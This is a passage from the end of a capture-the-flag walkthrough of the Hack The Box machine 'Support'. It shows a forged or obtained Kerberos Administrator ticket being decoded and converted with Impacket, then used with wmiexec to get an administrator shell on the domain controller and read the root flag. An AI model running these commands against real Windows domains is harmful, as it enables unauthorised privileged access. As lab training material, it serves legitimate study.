      zjEE++a4294nsYFPXqcks69gadlXJFNkRhBHkkWBRqjFSxfbuRu21BMyIZqcJscZuUj+EJ7Pd5c5yBAY
      LmZdLRz4p6Coo3PKnS+ZjSBqwSCuxugbIK1Qxgsa9jk4Uqun+EZ1s79Ts7y/c23ltzCmuGi0D05Al/Cb
      aVPyNpMq4ERP8mCXXX1CVFR5FqvizH4j3y+GasJ4zsFfks4T7Ni0iEabzUBRFYfCH8N2+FmHLH9Mn73Z
      zDlq1gBxeFumJCmpsYaaeDFM7/t934hBh/Tc191sqJFulXnUi97PKBHyWycycy30WexNLsRymlRmTWG4
      qnzmtzZc78iL+9NzxAaJu+OAaV2VIXYhFW6MlDIalbXt+pOHg5targdf1fzy5IV49W5w25TdPN3BlHF2
      Te5WYVqMqXDYFsZmf95iyRDaS4LQl2DnIfNtJMeLLNVUbPpi5dTfIezLnsha8Gb/vAZOk4ixMnnimnrV
      j6ONRR7aogLZMXDLJSG3JCzLl5yQJVtIKWucfiED2Q1dNjV/HZwoWkE+0/LgD1wJpuZBmuOIrULQyqHY
      NGbz0EGTuM2Hsrwkeqdw5B1JTVTlE1tpZJgVuB3wyYGEO5CblvrGVtHcwj+W0wi5WTFL9N5F9dTYwV6n
      RwScJ0Zj1otI2rxYH7cBbXTfIhQmh3vK8OgUQOYGvZzq5BhwiaBLTZQDH1TRc7olVUqZf6jxBYfVLWt3
      2ActkCZG2b48YhM2ayg2Dtal1TYGix+prkAJFz78oqtgAqHLGhJPOJpvwsjZbS6bGK452iBtXHFmUY61
      BasDWnQVEC68P2kWrgNZN3t6q6BrfzKyRf07zo/ClJaxbZvpxHLZNxSRsipGqDhfonLgH1vqd9xdYtvP
      tiqhZuU/48jAUTiGoGAU6uKXtBOIWt/c2VLJoatOwcPmj9BrtSWbIkKqxKkDcKxZObiNlPMdpWfi/ZDn
      UeAnPMUXzRUvF7sYbubf/8g+W1vvviLQSiMsxRelz0vYZAQESP6qxcVZqAGLW4iW95gnZaOB2TCB1qAD
      AgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgERoRIEEEvRJqbN1kMB4ZS2vHWfsbOhDRsLU1VQ
      UE9SVC5IVEKiGjAYoAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjQxMTIyMTQ0
      MTA5WqYRGA8yMDI0MTEyMzAwNDEwOVqnERgPMjAyNDExMjkxNDQxMDlaqA0bC1NVUFBPUlQuSFRCqSEw
      H6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI=
```

`cat ./ticket.txt | tr -d ' ' | tr -d '\n' | tee ./ticket.kirbi.b64`:
```
doIGcDCCBmygAwIBBaEDAgEWooIFgjCCBX5hggV6MIIFdqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggU7MIIFN6ADAgESoQMCAQaiggUpBIIFJaDGA5c8f1eq4EUCd664d+jyNy1dug60hlRzgoL5bYPM//W+Jd8CfZdbAXCWfpLGi+ZaGsgfth3cHwXMxKuT0RLkNOO4oaXzyZdBujZzIrTFVTR2PHfmqaW89b7F+Jkn5Jq/ZKdaFwsGtd4qkzDK4xx//ekY+0JXSPHA+4L8CYB7h2pbEbWXOy9ZoUjn+SGAQyxu6viAFNWtjBerNEPPymrH3wBJjQF5jV0SB4EgREEUpMb0EyJL1fYxhMaC2u35WOXyHUvtjFkHKZea6oKyjCbf8oNw3dciT0TisaSFQ7BSb2cKRzl+UW831J5UL9LwPsqdNpEN7VX00vUiXO1wHi5I0HZYVM5T4CNSLg/zojX4iL2QE6901mUR1Zuml4CctpuKoeGkgsE5143xMY6A3x3eUWBQD01WLLHOkrZ5MkJwPCYcZ2xG4ESLZHtjNUi8cbsZqxP9QBME3alfpZuSS79chvYRTbC5xEInpDDEGSITTwjfnJ++4PmtGCQQA1qy9TWDWRJ/vguWBxrSVDKdZOIr1CKvRgm51ILkucueJQ2kYucabnp2zDdr3K+fWYI1M+1FMzB4UV9oFJ+l5/3wv3cO3ncSyckCXexJSVTMu22+aLOkej27QY7jhXbe8hieryb0i0phaj46r0tyXDZ4l+ly1gRdbEDInP1Zkl8VXNkbvvOYQMhm/ONBmBtO40LUkToeOKslhg+WPQ69CcZxmJWOzjEE++a4294nsYFPXqcks69gadlXJFNkRhBHkkWBRqjFSxfbuRu21BMyIZqcJscZuUj+EJ7Pd5c5yBAYLmZdLRz4p6Coo3PKnS+ZjSBqwSCuxugbIK1Qxgsa9jk4Uqun+EZ1s79Ts7y/c23ltzCmuGi0D05Al/CbaVPyNpMq4ERP8mCXXX1CVFR5FqvizH4j3y+GasJ4zsFfks4T7Ni0iEabzUBRFYfCH8N2+FmHLH9Mn73ZzDlq1gBxeFumJCmpsYaaeDFM7/t934hBh/Tc191sqJFulXnUi97PKBHyWycycy30WexNLsRymlRmTWG4qnzmtzZc78iL+9NzxAaJu+OAaV2VIXYhFW6MlDIalbXt+pOHg5targdf1fzy5IV49W5w25TdPN3BlHF2Te5WYVqMqXDYFsZmf95iyRDaS4LQl2DnIfNtJMeLLNVUbPpi5dTfIezLnsha8Gb/vAZOk4ixMnnimnrVj6ONRR7aogLZMXDLJSG3JCzLl5yQJVtIKWucfiED2Q1dNjV/HZwoWkE+0/LgD1wJpuZBmuOIrULQyqHYNGbz0EGTuM2Hsrwkeqdw5B1JTVTlE1tpZJgVuB3wyYGEO5CblvrGVtHcwj+W0wi5WTFL9N5F9dTYwV6nRwScJ0Zj1otI2rxYH7cBbXTfIhQmh3vK8OgUQOYGvZzq5BhwiaBLTZQDH1TRc7olVUqZf6jxBYfVLWt32ActkCZG2b48YhM2ayg2Dtal1TYGix+prkAJFz78oqtgAqHLGhJPOJpvwsjZbS6bGK452iBtXHFmUY61BasDWnQVEC68P2kWrgNZN3t6q6BrfzKyRf07zo/ClJaxbZvpxHLZNxSRsipGqDhfonLgH1vqd9xdYtvPtiqhZuU/48jAUTiGoGAU6uKXtBOIWt/c2VLJoatOwcPmj9BrtSWbIkKqxKkDcKxZObiNlPMdpWfi/ZDnUeAnPMUXzRUvF7sYbubf/8g+W1vvviLQSiMsxRelz0vYZAQESP6qxcVZqAGLW4iW95gnZaOB2TCB1qADAgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgERoRIEEEvRJqbN1kMB4ZS2vHWfsbOhDRsLU1VQUE9SVC5IVEKiGjAYoAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjQxMTIyMTQ0MTA5WqYRGA8yMDI0MTEyMzAwNDEwOVqnERgPMjAyNDExMjkxNDQxMDlaqA0bC1NVUFBPUlQuSFRCqSEwH6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI=
```

Next, create a new file called `ticket.kirbi` with the Base64 decoded value of the previous ticket.
Finally, we can convert this ticket to a format that `Impacket` can use. This can be achieved with `Impacket`'s `TicketConverter.py`.

`base64 -d ./ticket.kirbi.b64 > ./ticket.kirbi`

`impacket-ticketConverter ./ticket.kirbi ./ticket.ccache`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

To acquire a shell we can use `Impacket`'s `wmiexec.py`.

`KRB5CCNAME=./ticket.ccache impacket-wmiexec 'support.htb/Administrator@dc.support.htb' -k -no-pass`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
support\administrator
```

`cd C:\\Users\Administrator\Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users\Administrator\Desktop

05/28/2022  03:17 AM    <DIR>          .
05/28/2022  03:11 AM    <DIR>          ..
11/22/2024  06:34 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,927,937,024 bytes free
```

`type root.txt`:
```
b0bf7*************************** 🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
